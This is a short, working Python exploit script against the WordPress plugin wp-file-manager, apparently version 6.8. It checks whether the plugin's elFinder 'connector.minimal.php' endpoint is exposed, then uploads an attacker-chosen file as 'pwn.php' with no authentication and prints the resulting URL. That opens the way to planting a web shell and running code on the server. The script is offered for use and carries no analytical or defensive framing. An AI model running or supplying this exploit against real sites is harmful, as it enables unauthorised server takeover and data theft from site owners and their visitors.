#!/usr/bin/env python3
# coding: utf-8
import requests
import urllib3
import argparse
from urllib.parse import urljoin
import json

urllib3.disable_warnings()
# requests: http://docs.python-requests.org/en/master/

proxy = {
        'http'  : 'http://127.0.0.1:8080',
        'https' : 'http://127.0.0.1:8080'
        }
user_agent = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.170 Safari/537.36'

# https://requests.readthedocs.io/en/master/user/advanced/
s = requests.Session()
s.proxies = proxy
s.verify = False
s.cookies.clear()
s.headers.update({'User-Agent': user_agent})
connector = '/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php'

def send_file(url, filename):
    files = {'upload[]': ("pwn.php", open(filename, 'rb'), 'application/x-php'),
    'action':(None, 'mk_file_folder_manager'),
    'target':(None, 'l1_Lw'),
    'cmd':(None, 'upload'),
    'reqid': (None, '1')}

    r = s.post(urljoin(url, connector), files=files)
    if r.status_code == 200:
        j = r.json()
        if len(j['added']) > 0:
            print("[+] Exploited")
            print(urljoin(url,r.json()['added'][0]['url']))
        else:
            print('[-] Something fail\n%s' % j)
    else:
        print("[-] Potentially non exploitable")

def check(url):
    r = s.get(urljoin(url, connector))
    if r.status_code == 200:
        if r.json()['error']:
            print("[+] Connector.minimal is exposed")
            return True
    return False

parser = argparse.ArgumentParser(epilog='Example: wp-file-manager-6.8.py -f info.php http://x.x.x.x/')
parser.add_argument('--file', '-f',
    dest = 'file',
    help = 'file to upload')
parser.add_argument(type=str,
    dest = 'target',
    help = 'Target URL')
args = parser.parse_args()

if check(args.target):
    send_file(args.target, args.file)
